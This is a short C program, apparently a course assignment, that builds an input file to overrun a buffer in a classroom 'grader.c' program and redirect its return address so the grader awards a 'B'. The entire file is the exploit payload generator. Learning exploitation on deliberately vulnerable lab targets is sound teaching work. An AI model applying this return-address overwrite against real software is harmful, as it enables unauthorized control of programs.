/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* by Andy Nguyen and Icey Ai                                         */
/*--------------------------------------------------------------------*/


/*--------------------------------------------------------------------*/
/* creates a file named "dataB" with the goal of performing a buffer  */
/*    overrun attack on the grader.c program to give the user a 'B'   */
/*--------------------------------------------------------------------*/
#include <stdio.h>

int main(void) {

    int i;
    unsigned long addr;
    FILE *file;
    file = fopen("dataB", "w");

    /* Writes our names into the file */
    fprintf(file, "Andy & Icey");

    /* Write 37 null bytes until reaching the end of buf*/
    for (i = 0; i < 37; i++) {
        putc(0, file);
    }

    /* Write addr of where to return in the assembly code */
    addr = 0x400858;
    fwrite(&addr, sizeof(unsigned long), 1, file);

    /* Close the file and return 0 */
    fclose(file);
    return 0;
}

